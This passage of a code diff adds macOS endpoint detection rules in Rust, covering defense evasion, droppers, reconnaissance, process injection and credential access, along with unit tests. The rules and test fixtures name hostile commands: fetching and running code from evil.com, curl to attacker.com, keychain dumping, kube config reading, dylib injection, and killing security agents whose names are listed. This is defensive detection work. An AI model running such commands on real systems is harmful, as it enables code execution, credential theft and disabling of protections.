+                    "rm targeting system or application log directories — log deletion to cover tracks",
+                );
+            }
+
+            // macOS unified log erase
+            if cmd_basename == "log"
+                && (args_lower.contains("erase") || args_lower.contains("delete"))
+            {
+                break 'detection (
+                    "log_erase_command", "T1070.002", AlertSeverity::High,
+                    "macOS unified log erase command — clearing event log to cover tracks",
+                );
+            }
+
+            // Timestamp stomping
+            if cmd_basename == "touch"
+                && (args_lower.contains(" -t ") || args_lower.contains(" -r "))
+                && (from_downloads || is_interpreter_parent)
+            {
+                break 'detection (
+                    "timestamp_stomping", "T1070.006", AlertSeverity::Medium,
+                    "touch modifying file timestamps from interpreter chain — timestamp stomping to evade forensics",
+                );
+            }
+
+            // Security agent kill
+            let security_process_names = [
+                "hound", "santad", "sentinelagent", "falcon", "cbsensor",
+                "malwarebytes", "xprotect", "syspolicyd", "trustd", "amfid",
+                "taskgated", "mrt",
+            ];
+            if (cmd_basename == "pkill" || cmd_basename == "killall" || cmd_basename == "kill")
+                && security_process_names.iter().any(|n| args_lower.contains(*n))
+            {
+                break 'detection (
+                    "security_agent_kill_attempt", "T1562.001", AlertSeverity::Critical,
+                    "Security agent or EDR process targeted with kill/pkill/killall",
+                );
+            }
+
+            // SIP disable (defense evasion category — supplements boot_security_tamper)
+            if cmd_basename == "csrutil" && args_lower.contains("disable") {
+                break 'detection (
+                    "sip_disable_attempt", "T1562.002", AlertSeverity::Critical,
+                    "csrutil disable — System Integrity Protection deactivation attempt",
+                );
+            }
+
+            // Shell history clearing
+            if cmd_basename == "rm"
+                && (args_lower.contains(".zsh_history")
+                    || args_lower.contains(".bash_history")
+                    || args_lower.contains("/.history"))
+            {
+                break 'detection (
+                    "history_clear", "T1070.003", AlertSeverity::Medium,
+                    "Shell history file deleted — clearing activity trail",
+                );
+            }
+
+            continue 'process;
+        };
+
+        let mut details = json!({
+            "pid": process.pid,
+            "ppid": process.ppid,
+            "command": process.command,
+            "args": process.args,
+            "process_kind": process.process_kind,
+            "parent_command": process.parent_command,
+            "parent_process_kind": process.parent_process_kind,
+            "trigger": trigger,
+            "mitre_technique": mitre,
+            "confidence": "medium",
+        });
+        merge_chain_details(&mut details, chain_details(process.pid, ctx));
+
+        alerts.push(build_alert(
+            ctx.now,
+            "alert_defense_evasion_active",
+            severity,
+            "defense_evasion",
+            reason,
+            details,
+        ));
+    }
+
+    // File-based: oversized executable in Downloads (packed payload indicator)
+    let cutoff = ctx.now - chrono::Duration::seconds(120);
+    for event in &ctx.recent_file_events {
+        if event.timestamp < cutoff || !event.is_executable {
+            continue;
+        }
+        if event.size_bytes > 50 * 1024 * 1024
+            && (event.path.contains("/Downloads/") || event.path.contains("/tmp/"))
+        {
+            alerts.push(build_alert(
+                ctx.now,
+                "alert_defense_evasion_active",
+                AlertSeverity::Low,
+                "defense_evasion",
+                "Oversized executable in Downloads or /tmp — possible packed payload",
+                json!({
+                    "path": event.path,
+                    "size_bytes": event.size_bytes,
+                    "trigger": "oversized_executable",
+                    "mitre_technique": "T1027.002",
+                    "confidence": "low",
+                }),
+            ));
+        }
+    }
+
+    alerts
+}
+
+// ─── Tranche 2 — Malicious Document & Dropper Detection ───────────────────────
+
+fn detect_malicious_document(ctx: &DetectionContext) -> Vec<TelemetryEvent> {
+    let mut alerts = Vec::new();
+
+    for process in &ctx.recent_processes {
+        if process.process_kind == "system" || process.process_kind == "browser" {
+            continue;
+        }
+
+        let cmd_basename = Path::new(&process.command)
+            .file_name()
+            .and_then(|n| n.to_str())
+            .unwrap_or("")
+            .to_ascii_lowercase();
+        let args_lower = process.args.to_ascii_lowercase();
+        let parent_kind = process.parent_process_kind.as_deref().unwrap_or("");
+        let parent_cmd_lower = process.parent_command.as_deref().unwrap_or("").to_ascii_lowercase();
+        let from_downloads = process.behavior.references_downloads_path
+            || process.command_path_kind == "downloads";
+
+        // JXA execution: osascript -l JavaScript with system calls
+        if cmd_basename == "osascript"
+            && (args_lower.contains("-l javascript") || args_lower.contains(".jxa"))
+            && (args_lower.contains("shell") || args_lower.contains("exec")
+                || args_lower.contains("run") || from_downloads)
+        {
+            let mut details = json!({
+                "pid": process.pid,
+                "ppid": process.ppid,
+                "command": process.command,
+                "args": process.args,
+                "process_kind": process.process_kind,
+                "parent_command": process.parent_command,
+                "parent_process_kind": process.parent_process_kind,
+                "trigger": "jxa_execution",
+                "mitre_technique": "T1059.007",
+                "confidence": "high",
+            });
+            merge_chain_details(&mut details, chain_details(process.pid, ctx));
+            alerts.push(build_alert(
+                ctx.now,
+                "alert_jxa_execution",
+                AlertSeverity::High,
+                "execution",
+                "JXA (JavaScript for Automation) executing system calls — common malicious document payload",
+                details,
+            ));
+            continue;
+        }
+
+        // Automator workflow from suspicious context
+        if (cmd_basename == "automator" || cmd_basename == "automator-run-workflow")
+            && (from_downloads
+                || parent_kind == "interpreter"
+                || parent_cmd_lower.contains("finder"))
+        {
+            let mut details = json!({
+                "pid": process.pid,
+                "ppid": process.ppid,
+                "command": process.command,
+                "args": process.args,
+                "process_kind": process.process_kind,
+                "parent_command": process.parent_command,
+                "parent_process_kind": process.parent_process_kind,
+                "trigger": "automator_from_downloads",
+                "mitre_technique": "T1059.002",
+                "confidence": "medium",
+            });
+            merge_chain_details(&mut details, chain_details(process.pid, ctx));
+            alerts.push(build_alert(
+                ctx.now,
+                "alert_automator_workflow_execution",
+                AlertSeverity::High,
+                "execution",
+                "Automator workflow executed from Downloads or interpreter chain — common dropper mechanism",
+                details,
+            ));
+            continue;
+        }
+
+        // Script applet in Downloads — .app bundle wrapping a shell script
+        if (parent_kind == "interpreter" || parent_kind == "user_app")
+            && from_downloads
+            && (parent_cmd_lower.contains(".app/contents/macos")
+                || args_lower.contains(".app/contents/"))
+        {
+            let mut details = json!({
+                "pid": process.pid,
+                "ppid": process.ppid,
+                "command": process.command,
+                "args": process.args,
+                "process_kind": process.process_kind,
+                "parent_command": process.parent_command,
+                "parent_process_kind": process.parent_process_kind,
+                "trigger": "script_applet_in_downloads",
+                "mitre_technique": "T1059",
+                "confidence": "medium",
+            });
+            merge_chain_details(&mut details, chain_details(process.pid, ctx));
+            alerts.push(build_alert(
+                ctx.now,
+                "alert_script_applet_in_downloads",
+                AlertSeverity::High,
+                "execution",
+                "Script applet (.app bundle wrapping a shell script) executed from Downloads",
+                details,
+            ));
+            continue;
+        }
+
+        // Archive dropper: unzip/tar extracting to /tmp or Downloads from interpreter chain
+        if (cmd_basename == "unzip" || cmd_basename == "tar" || cmd_basename == "ditto")
+            && (args_lower.contains("/tmp/") || args_lower.contains("/downloads/"))
+            && parent_kind == "interpreter"
+        {
+            let mut details = json!({
+                "pid": process.pid,
+                "ppid": process.ppid,
+                "command": process.command,
+                "args": process.args,
+                "process_kind": process.process_kind,
+                "parent_command": process.parent_command,
+                "parent_process_kind": process.parent_process_kind,
+                "trigger": "archive_dropper",
+                "mitre_technique": "T1204.002",
+                "confidence": "medium",
+            });
+            merge_chain_details(&mut details, chain_details(process.pid, ctx));
+            alerts.push(build_alert(
+                ctx.now,
+                "alert_archive_dropper_execution",
+                AlertSeverity::High,
+                "execution",
+                "Archive tool extracting to /tmp or Downloads from interpreter chain — dropper staging",
+                details,
+            ));
+            continue;
+        }
+    }
+
+    // File-based: fake PDFs in Downloads (magic bytes mismatch with .pdf extension)
+    let cutoff = ctx.now - chrono::Duration::seconds(120);
+    for event in &ctx.recent_file_events {
+        if event.timestamp < cutoff {
+            continue;
+        }
+        let path_lower = event.path.to_ascii_lowercase();
+        if !path_lower.contains("/downloads/") && !path_lower.contains("/desktop/") {
+            continue;
+        }
+        if !path_lower.ends_with(".pdf") {
+            continue;
+        }
+        let magic_is_not_pdf = event.magic_bytes_hint.as_deref()
+            .map(|m| {
+                let ml = m.to_ascii_lowercase();
+                ml.contains("elf") || ml.contains("macho") || ml.contains("script")
+                    || ml.contains("executable") || ml.contains("zip") || ml.contains("jar")
+            })
+            .unwrap_or(false);
+
+        if magic_is_not_pdf {
+            alerts.push(build_alert(
+                ctx.now,
+                "alert_fake_pdf_detected",
+                AlertSeverity::Critical,
+                "masquerading",
+                "File with .pdf extension has executable or archive magic bytes — fake PDF dropper",
+                json!({
+                    "path": event.path,
+                    "magic_bytes_hint": event.magic_bytes_hint,
+                    "trigger": "fake_pdf",
+                    "mitre_technique": "T1036.007",
+                    "confidence": "high",
+                }),
+            ));
+        }
+    }
+
+    alerts
+}
+
+// ─── Tranche 3 — Reconnaissance Correlation (T1082, T1518.001, T1497.001) ─────
+
+/// Detect security tool enumeration: processes checking for specific AV/EDR tools.
+/// MITRE T1518.001
+fn is_security_tool_discovery(cmd_basename: &str, args_lower: &str) -> bool {
+    // ps aux / ps -ef checking for security processes
+    if cmd_basename == "ps" && (args_lower.contains("aux") || args_lower.contains("-ef")) {
+        return true;
+    }
+    // which/type checking for security tool paths
+    if cmd_basename == "which" || cmd_basename == "type" {
+        let security_tools = [
+            "santad", "crowdstrike", "cbagentd", "sentinel", "xprotect",
+            "malwarebytes", "little-snitch", "lsmon",
+        ];
+        if security_tools.iter().any(|t| args_lower.contains(t)) {
+            return true;
+        }
+    }
+    // find looking for security agent files
+    if cmd_basename == "find" {
+        let security_paths = [
+            "/library/cs agent", "crowdstrike", "carbon black",
+            "sentinelone", "cylance", "xprotect", "santa",
+        ];
+        if security_paths.iter().any(|p| args_lower.contains(p)) {
+            return true;
+        }
+    }
+    // launchctl list piped for security processes
+    if cmd_basename == "launchctl" && args_lower.contains("list") {
+        return true;
+    }
+    false
+}
+
+/// Detect sandbox / VM detection attempts.
+/// MITRE T1497.001
+fn is_sandbox_detection(cmd_basename: &str, args_lower: &str) -> bool {
+    // sysctl checking for hypervisor presence
+    if cmd_basename == "sysctl" {
+        let vm_keys = ["kern.hv_vmm_present", "hw.model", "machdep.cpu.brand_string"];
+        if vm_keys.iter().any(|k| args_lower.contains(k)) {
+            return true;
+        }
+    }
+    // ioreg checking for VM device strings
+    if cmd_basename == "ioreg" && (args_lower.contains("vmware") || args_lower.contains("vbox")
+        || args_lower.contains("parallels") || args_lower.contains("qemu"))
+    {
+        return true;
+    }
+    // system_profiler checking for VM hardware
+    if cmd_basename == "system_profiler" && args_lower.contains("sphardwaredatatype") {
+        return true;
+    }
+    false
+}
+
+fn detect_recon_correlation(ctx: &DetectionContext) -> Vec<TelemetryEvent> {
+    use std::collections::{HashMap, HashSet};
+
+    let mut alerts = Vec::new();
+
+    // Per-ppid tracking of which recon categories have been seen
+    // Categories: system, network, filesystem, security_tool
+    let mut ppid_categories: HashMap<i32, HashSet<&'static str>> = HashMap::new();
+
+    for process in &ctx.recent_processes {
+        if process.process_kind == "system" || process.process_kind == "browser" {
+            continue;
+        }
+
+        let cmd_basename = Path::new(&process.command)
+            .file_name()
+            .and_then(|n| n.to_str())
+            .unwrap_or("")
+            .to_ascii_lowercase();
+        let args_lower = process.args.to_ascii_lowercase();
+
+        let ppid = process.ppid;
+
+        // Check which recon category this process falls into
+        let system_recon_cmds = [
+            "system_profiler", "sw_vers", "uname", "hostname", "sysctl", "ioreg",
+            "nvram", "profiler",
+        ];
+        let network_recon_cmds = [
+            "ifconfig", "netstat", "arp", "route", "networksetup", "scutil",
+            "nmap", "ping", "traceroute", "dig", "nslookup", "host",
+        ];
+        let filesystem_recon_cmds = ["find", "ls", "locate", "mdfind"];
+
+        if system_recon_cmds.iter().any(|c| cmd_basename == *c) {
+            ppid_categories.entry(ppid).or_default().insert("system");
+        }
+        if network_recon_cmds.iter().any(|c| cmd_basename == *c) {
+            ppid_categories.entry(ppid).or_default().insert("network");
+        }
+        if filesystem_recon_cmds.iter().any(|c| cmd_basename == *c) {
+            ppid_categories.entry(ppid).or_default().insert("filesystem");
+        }
+
+        // ── Security tool discovery ───────────────────────────────────────────
+
+        if is_security_tool_discovery(&cmd_basename, &args_lower) {
+            // Only from non-system parents
+            let parent_kind = process.parent_process_kind.as_deref().unwrap_or("");
+            if parent_kind != "system" && parent_kind != "browser" {
+                alerts.push(build_alert(
+                    ctx.now,
+                    "alert_security_tool_discovery",
+                    AlertSeverity::Medium,
+                    "discovery",
+                    "Process enumerating security tools or agents — attacker profiling defenses",
+                    json!({
+                        "pid": process.pid,
+                        "ppid": process.ppid,
+                        "command": process.command,
+                        "args": process.args,
+                        "process_kind": process.process_kind,
+                        "trigger": "security_tool_discovery",
+                        "mitre_technique": "T1518.001",
+                        "confidence": "medium",
+                    }),
+                ));
+            }
+        }
+
+        // ── Sandbox / VM detection ────────────────────────────────────────────
+
+        if is_sandbox_detection(&cmd_basename, &args_lower) {
+            let parent_kind = process.parent_process_kind.as_deref().unwrap_or("");
+            if parent_kind == "interpreter" || parent_kind == "unknown" {
+                alerts.push(build_alert(
+                    ctx.now,
+                    "alert_sandbox_detection_attempt",
+                    AlertSeverity::Medium,
+                    "discovery",
+                    "Process probing for virtualization or sandbox indicators from interpreter chain",
+                    json!({
+                        "pid": process.pid,
+                        "ppid": process.ppid,
+                        "command": process.command,
+                        "args": process.args,
+                        "process_kind": process.process_kind,
+                        "trigger": "sandbox_detection",
+                        "mitre_technique": "T1497.001",
+                        "confidence": "medium",
+                    }),
+                ));
+            }
+        }
+    }
+
+    // ── Automated recon: 3+ distinct categories from same ppid ───────────────
+
+    for (ppid, categories) in &ppid_categories {
+        if categories.len() >= 3 {
+            alerts.push(build_alert(
+                ctx.now,
+                "alert_automated_recon_detected",
+                AlertSeverity::High,
+                "discovery",
+                "Multiple recon categories from same parent — automated reconnaissance in progress",
+                json!({
+                    "ppid": ppid,
+                    "categories": categories.iter().copied().collect::<Vec<_>>(),
+                    "category_count": categories.len(),
+                    "trigger": "multi_category_recon",
+                    "mitre_technique": "T1082",
+                    "confidence": "high",
+                }),
+            ));
+        }
+    }
+
+    alerts
+}
+
+// ─── Tranche 3 — Cryptomining Detection wrapper ───────────────────────────────
+
+fn detect_cryptomining_ext(ctx: &DetectionContext) -> Vec<TelemetryEvent> {
+    let mut alerts = Vec::new();
+    for process in &ctx.recent_processes {
+        alerts.extend(cryptomining::detect_cryptomining(process, ctx.now));
+    }
+    alerts
+}
+
+// ─── Tranche 3 — Lateral Movement & Privilege Escalation wrapper ─────────────
+
+fn detect_lateral_movement_ext(ctx: &DetectionContext) -> Vec<TelemetryEvent> {
+    let mut alerts = Vec::new();
+    for process in &ctx.recent_processes {
+        alerts.extend(lateral_movement::detect_lateral_movement(process, ctx.now));
+    }
+    alerts
+}
+
+// ─── Tranche 3 — Data Exfiltration Detection wrapper ─────────────────────────
+
+fn detect_exfiltration_ext(ctx: &DetectionContext) -> Vec<TelemetryEvent> {
+    let mut alerts = Vec::new();
+    for process in &ctx.recent_processes {
+        alerts.extend(exfiltration::detect_exfiltration(process, ctx.now));
+    }
+    alerts
+}
+
 // ─── Unit tests ──────────────────────────────────────────────────────────────
 
 #[cfg(test)]
@@ -4743,6 +6243,111 @@ mod tests {
         );
     }
 
+    // ── detect_recon_correlation ───────────────────────────────────────────────
+
+    #[test]
+    fn automated_recon_fires_for_three_categories_same_ppid() {
+        let now = Utc::now();
+        let mut ctx = empty_ctx(now);
+        // system recon
+        let mut p1 = make_process(5001, 900, "/usr/bin/system_profiler", "SPHardwareDataType", "user_app");
+        p1.parent_process_kind = Some("interpreter".to_string());
+        ctx.recent_processes.push(p1);
+        // network recon
+        let mut p2 = make_process(5002, 900, "/sbin/ifconfig", "-a", "user_app");
+        p2.parent_process_kind = Some("interpreter".to_string());
+        ctx.recent_processes.push(p2);
+        // filesystem recon
+        let mut p3 = make_process(5003, 900, "/usr/bin/find", "/Users -name '*.key'", "user_app");
+        p3.parent_process_kind = Some("interpreter".to_string());
+        ctx.recent_processes.push(p3);
+        let events = detect_recon_correlation(&ctx);
+        assert!(
+            events.iter().any(|e| e.event_type == "alert_automated_recon_detected"),
+            "3 recon categories from same ppid should fire automated recon alert"
+        );
+    }
+
+    #[test]
+    fn security_tool_discovery_fires_for_which_santad() {
+        let now = Utc::now();
+        let mut ctx = empty_ctx(now);
+        let mut p = make_process(5010, 900, "/usr/bin/which", "santad", "user_app");
+        p.parent_process_kind = Some("interpreter".to_string());
+        ctx.recent_processes.push(p);
+        let events = detect_recon_correlation(&ctx);
+        assert!(
+            events.iter().any(|e| e.event_type == "alert_security_tool_discovery"),
+            "which santad from interpreter should fire security tool discovery"
+        );
+    }
+
+    #[test]
+    fn sandbox_detection_fires_for_sysctl_hv_vmm_from_interpreter() {
+        let now = Utc::now();
+        let mut ctx = empty_ctx(now);
+        let mut p = make_process(5020, 900, "/usr/sbin/sysctl", "kern.hv_vmm_present", "user_app");
+        p.parent_process_kind = Some("interpreter".to_string());
+        ctx.recent_processes.push(p);
+        let events = detect_recon_correlation(&ctx);
+        assert!(
+            events.iter().any(|e| e.event_type == "alert_sandbox_detection_attempt"),
+            "sysctl kern.hv_vmm_present from interpreter should fire sandbox detection"
+        );
+    }
+
+    #[test]
+    fn automated_recon_does_not_fire_for_two_categories() {
+        let now = Utc::now();
+        let mut ctx = empty_ctx(now);
+        let mut p1 = make_process(5030, 900, "/usr/bin/system_profiler", "SPHardwareDataType", "user_app");
+        p1.parent_process_kind = Some("interpreter".to_string());
+        ctx.recent_processes.push(p1);
+        let mut p2 = make_process(5031, 900, "/sbin/ifconfig", "-a", "user_app");
+        p2.parent_process_kind = Some("interpreter".to_string());
+        ctx.recent_processes.push(p2);
+        let events = detect_recon_correlation(&ctx);
+        assert!(
+            !events.iter().any(|e| e.event_type == "alert_automated_recon_detected"),
+            "only 2 recon categories should not fire automated recon alert"
+        );
+    }
+
+    #[test]
+    fn automated_recon_does_not_fire_for_different_ppids() {
+        let now = Utc::now();
+        let mut ctx = empty_ctx(now);
+        // Three categories but all different ppids — should not correlate
+        let mut p1 = make_process(5040, 901, "/usr/bin/system_profiler", "SPHardwareDataType", "user_app");
+        p1.parent_process_kind = Some("interpreter".to_string());
+        ctx.recent_processes.push(p1);
+        let mut p2 = make_process(5041, 902, "/sbin/ifconfig", "-a", "user_app");
+        p2.parent_process_kind = Some("interpreter".to_string());
+        ctx.recent_processes.push(p2);
+        let mut p3 = make_process(5042, 903, "/usr/bin/find", "/Users -name '*.key'", "user_app");
+        p3.parent_process_kind = Some("interpreter".to_string());
+        ctx.recent_processes.push(p3);
+        let events = detect_recon_correlation(&ctx);
+        assert!(
+            !events.iter().any(|e| e.event_type == "alert_automated_recon_detected"),
+            "three categories from different ppids should not fire"
+        );
+    }
+
+    #[test]
+    fn security_tool_discovery_does_not_fire_for_system_process() {
+        let now = Utc::now();
+        let mut ctx = empty_ctx(now);
+        let mut p = make_process(5050, 1, "/usr/bin/which", "santad", "system");
+        p.parent_process_kind = Some("system".to_string());
+        ctx.recent_processes.push(p);
+        let events = detect_recon_correlation(&ctx);
+        assert!(
+            !events.iter().any(|e| e.event_type == "alert_security_tool_discovery"),
+            "which santad from system parent should not fire"
+        );
+    }
+
     // ── detect_privilege_escalation ────────────────────────────────────────────
 
     #[test]
@@ -5661,6 +7266,391 @@ mod tests {
         assert!(
             events.iter().all(|e| e.event_type != "alert_plist_modification"),
             "defaults write to a non-persistence domain should not trigger"
+        );
+    }
+
+    // ── detect_obfuscated_content ──────────────────────────────────────────────
+
+    #[test]
+    fn obfuscation_no_alert_on_empty_context() {
+        let ctx = empty_ctx(Utc::now());
+        let events = detect_obfuscated_content(&ctx);
+        assert!(events.is_empty());
+    }
+
+    #[test]
+    fn obfuscation_no_alert_for_old_file_events() {
+        let now = Utc::now();
+        let mut ctx = empty_ctx(now);
+        // File event older than 10s should not be analysed
+        ctx.recent_file_events.push(make_file_event(
+            "file_created",
+            "/tmp/old_script.sh",
+            false,
+            false,
+            30, // 30 seconds old
+        ));
+        let events = detect_obfuscated_content(&ctx);
+        assert!(
+            events.iter().all(|e| e.event_type != "alert_obfuscated_content_detected"),
+            "old file events should not trigger obfuscation alert"
+        );
+    }
+
+    // ── detect_llm_malware_patterns ───────────────────────────────────────────
+
+    #[test]
+    fn llm_malware_no_alert_on_empty_context() {
+        let ctx = empty_ctx(Utc::now());
+        let events = detect_llm_malware_patterns(&ctx);
+        assert!(events.is_empty());
+    }
+
+    #[test]
+    fn api_key_pattern_detects_openai_key() {
+        // 48 alphanumeric chars after sk- (matches OpenAI key format)
+        let text = "API_KEY = 'sk-abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOP01234567'\nresult = client.chat()";
+        assert!(
+            detect_api_key_in_text(text).is_some(),
+            "should detect OpenAI-style API key"
+        );
+    }
+
+    #[test]
+    fn api_key_pattern_passes_short_prefix() {
+        let text = "prefix = 'sk-short'\nresult = 1";
+        assert!(
+            detect_api_key_in_text(text).is_none(),
+            "short sk- prefix should not match"
+        );
+    }
+
+    #[test]
+    fn runtime_code_gen_detects_exec_requests() {
+        assert!(detect_runtime_code_generation(
+            "exec(requests.get('http://evil.com/payload').text)"
+        ));
+    }
+
+    #[test]
+    fn runtime_code_gen_passes_normal_exec() {
+        assert!(!detect_runtime_code_generation(
+            "subprocess.run(['ls', '-la'])"
+        ));
+    }
+
+    // ── detect_keychain_dump ──────────────────────────────────────────────────
+
+    #[test]
+    fn keychain_dump_fires_for_dump_keychain_command() {
+        let now = Utc::now();
+        let mut ctx = empty_ctx(now);
+        ctx.recent_processes.push(make_process(
+            9999,
+            1,
+            "/usr/bin/security",
+            "dump-keychain -d /Users/victim/Library/Keychains/login.keychain",
+            "user_app",
+        ));
+        let events = detect_keychain_dump(&ctx);
+        assert!(
+            events.iter().any(|e| e.event_type == "alert_keychain_dump_attempt"),
+            "dump-keychain should fire alert_keychain_dump_attempt"
+        );
+    }
+
+    #[test]
+    fn keychain_dump_no_alert_for_system_process() {
+        let now = Utc::now();
+        let mut ctx = empty_ctx(now);
+        ctx.recent_processes.push(make_process(
+            9999,
+            1,
+            "/usr/bin/security",
+            "dump-keychain",
+            "system", // system process — should be suppressed
+        ));
+        let events = detect_keychain_dump(&ctx);
+        assert!(
+            events.iter().all(|e| e.event_type != "alert_keychain_dump_attempt"),
+            "system process should not trigger keychain dump alert"
+        );
+    }
+
+    // ── detect_cloud_credential_access ───────────────────────────────────────
+
+    #[test]
+    fn cloud_cred_no_alert_for_legitimate_tool() {
+        let now = Utc::now();
+        let mut ctx = empty_ctx(now);
+        ctx.recent_processes.push(make_process(
+            5000,
+            1,
+            "/usr/local/bin/kubectl",
+            "get pods --kubeconfig=/Users/user/.kube/config",
+            "user_app",
+        ));
+        let events = detect_cloud_credential_access(&ctx);
+        assert!(
+            events.iter().all(|e| e.event_type != "alert_cloud_credential_access"),
+            "kubectl accessing its own config should not alert"
+        );
+    }
+
+    #[test]
+    fn cloud_cred_fires_for_suspicious_kube_access() {
+        let home = std::env::var("HOME").unwrap_or_default();
+        let now = Utc::now();
+        let mut ctx = empty_ctx(now);
+        ctx.recent_processes.push(make_process(
+            5001,
+            1,
+            "/usr/bin/python3",
+            &format!("-c \"open('{}/.kube/config').read()\"", home),
+            "interpreter",
+        ));
+        let events = detect_cloud_credential_access(&ctx);
+        assert!(
+            events.iter().any(|e| e.event_type == "alert_cloud_credential_access"),
+            "python reading kube config should trigger cloud credential alert"
+        );
+    }
+
+    // ── detect_clipboard_harvesting ───────────────────────────────────────────
+
+    #[test]
+    fn clipboard_no_alert_for_single_pbpaste() {
+        let now = Utc::now();
+        let mut ctx = empty_ctx(now);
+        ctx.recent_processes.push(make_process(1000, 500, "/usr/bin/pbpaste", "", "user_app"));
+        let events = detect_clipboard_harvesting(&ctx);
+        assert!(
+            events.iter().all(|e| e.event_type != "alert_clipboard_monitoring"),
+            "single pbpaste should not trigger alert"
+        );
+    }
+
+    #[test]
+    fn clipboard_fires_for_three_pbpaste_same_parent() {
+        let now = Utc::now();
+        let mut ctx = empty_ctx(now);
+        // Three pbpaste invocations with the same parent PID
+        for _ in 0..3 {
+            ctx.recent_processes.push(make_process(
+                1000, 500, "/usr/bin/pbpaste", "", "user_app",
+            ));
+        }
+        let events = detect_clipboard_harvesting(&ctx);
+        assert!(
+            events.iter().any(|e| e.event_type == "alert_clipboard_monitoring"),
+            "3x pbpaste from same parent should trigger clipboard harvesting alert"
+        );
+    }
+
+    // ── detect_process_injection ──────────────────────────────────────────────
+
+    #[test]
+    fn dyld_injection_fires_for_dyld_insert_libraries() {
+        let now = Utc::now();
+        let mut ctx = empty_ctx(now);
+        let mut p = make_process(3001, 500, "/usr/bin/python3", "DYLD_INSERT_LIBRARIES=/tmp/evil.dylib target_app", "interpreter");
+        p.parent_process_kind = Some("interpreter".to_string());
+        ctx.recent_processes.push(p);
+        let events = detect_process_injection(&ctx);
+        assert!(
+            events.iter().any(|e| e.event_type == "alert_dyld_injection_attempt"),
+            "DYLD_INSERT_LIBRARIES in args should fire dyld injection alert"
+        );
+    }
+
+    #[test]
+    fn process_hollowing_fires_for_bash_in_tmp() {
+        let now = Utc::now();
+        let mut ctx = empty_ctx(now);
+        let p = make_process(3002, 500, "/tmp/bash", "-c 'curl attacker.com'", "interpreter");
+        ctx.recent_processes.push(p);
+        let events = detect_process_injection(&ctx);
+        assert!(
+            events.iter().any(|e| e.event_type == "alert_process_hollowing_indicator"),
+            "bash from /tmp should fire process hollowing alert"
+        );
+    }
+
+    #[test]
+    fn process_hollowing_does_not_fire_for_system_bash() {
+        let now = Utc::now();
+        let mut ctx = empty_ctx(now);
+        let p = make_process(3003, 500, "/usr/bin/bash", "-c 'echo hello'", "interpreter");
+        ctx.recent_processes.push(p);
+        let events = detect_process_injection(&ctx);
+        assert!(
+            events.iter().all(|e| e.event_type != "alert_process_hollowing_indicator"),
+            "/usr/bin/bash should NOT fire process hollowing"
+        );
+    }
+
+    #[test]
+    fn debugger_from_interpreter_fires_alert() {
+        let now = Utc::now();
+        let mut ctx = empty_ctx(now);
+        let mut p = make_process(3004, 500, "/usr/bin/lldb", "-p 1234", "user_app");
+        p.parent_process_kind = Some("interpreter".to_string());
+        p.parent_command = Some("/usr/bin/python3".to_string());
+        ctx.recent_processes.push(p);
+        let events = detect_process_injection(&ctx);
+        assert!(
+            events.iter().any(|e| e.event_type == "alert_debugger_injection_attempt"),
+            "lldb from interpreter parent should fire debugger injection alert"
+        );
+    }
+
+    #[test]
+    fn tmp_binary_from_interpreter_fires_precursor() {
+        let now = Utc::now();
+        let mut ctx = empty_ctx(now);
+        let mut p = make_process(3005, 500, "/tmp/injector", "", "unknown");
+        p.parent_process_kind = Some("interpreter".to_string());
+        ctx.recent_processes.push(p);
+        let events = detect_process_injection(&ctx);
+        assert!(
+            events.iter().any(|e| e.event_type == "alert_process_injection_precursor"),
+            "unknown binary from /tmp via interpreter should fire injection precursor"
+        );
+    }
+
+    #[test]
+    fn debugger_from_terminal_does_not_fire() {
+        let now = Utc::now();
+        let mut ctx = empty_ctx(now);
+        let mut p = make_process(3006, 500, "/usr/bin/lldb", "my_program", "user_app");
+        p.parent_process_kind = Some("user_app".to_string());
+        p.parent_command = Some("/Applications/Terminal.app/Contents/MacOS/Terminal".to_string());
+        ctx.recent_processes.push(p);
+        let events = detect_process_injection(&ctx);
+        assert!(
+            events.iter().all(|e| e.event_type != "alert_debugger_injection_attempt"),
+            "lldb from Terminal interactively should NOT fire injection alert"
+        );
+    }
+
+    // ── detect_expanded_lolbins ───────────────────────────────────────────────
+
+    #[test]
+    fn osascript_shell_fires_expanded_lolbin() {
+        let now = Utc::now();
+        let mut ctx = empty_ctx(now);
+        let mut p = make_process(3010, 500, "/usr/bin/osascript", "-e 'do shell script \"curl attacker.com\"'", "interpreter");
+        p.parent_process_kind = Some("interpreter".to_string());
+        ctx.recent_processes.push(p);
+        let events = detect_expanded_lolbins(&ctx);
+        assert!(
+            events.iter().any(|e| e.event_type == "alert_expanded_lolbin"),
+            "osascript do shell script should fire expanded lolbin"
+        );
+    }
+
+    #[test]
+    fn xargs_shell_fires_expanded_lolbin() {
+        let now = Utc::now();
+        let mut ctx = empty_ctx(now);
+        let mut p = make_process(3011, 500, "/usr/bin/xargs", " bash -c 'id'", "user_app");
+        p.parent_process_kind = Some("interpreter".to_string());
+        ctx.recent_processes.push(p);
+        let events = detect_expanded_lolbins(&ctx);
+        assert!(
+            events.iter().any(|e| e.event_type == "alert_expanded_lolbin"),
+            "xargs bash should fire expanded lolbin"
+        );
+    }
+
+    #[test]
+    fn networksetup_setdns_fires_expanded_lolbin() {
+        let now = Utc::now();
+        let mut ctx = empty_ctx(now);
+        let p = make_process(3012, 500, "/usr/sbin/networksetup", "-setdnsservers Wi-Fi 1.2.3.4", "user_app");
+        ctx.recent_processes.push(p);
+        let events = detect_expanded_lolbins(&ctx);
+        assert!(
+            events.iter().any(|e| e.event_type == "alert_expanded_lolbin"),
+            "networksetup -setdnsservers should fire expanded lolbin"
+        );
+    }
+
+    // ── detect_defense_evasion_active ─────────────────────────────────────────
+
+    #[test]
+    fn log_erase_fires_defense_evasion() {
+        let now = Utc::now();
+        let mut ctx = empty_ctx(now);
+        let mut p = make_process(3020, 500, "/usr/bin/log", "erase --all", "user_app");
+        p.parent_process_kind = Some("interpreter".to_string());
+        ctx.recent_processes.push(p);
+        let events = detect_defense_evasion_active(&ctx);
+        assert!(
+            events.iter().any(|e| e.event_type == "alert_defense_evasion_active"),
+            "log erase should fire defense evasion"
+        );
+    }
+
+    #[test]
+    fn security_agent_kill_fires_defense_evasion() {
+        let now = Utc::now();
+        let mut ctx = empty_ctx(now);
+        let p = make_process(3021, 500, "/usr/bin/pkill", "-9 santad", "user_app");
+        ctx.recent_processes.push(p);
+        let events = detect_defense_evasion_active(&ctx);
+        assert!(
+            events.iter().any(|e| e.event_type == "alert_defense_evasion_active"),
+            "pkill targeting santad should fire defense evasion"
+        );
+    }
+
+    // ── detect_malicious_document ─────────────────────────────────────────────
+
+    #[test]
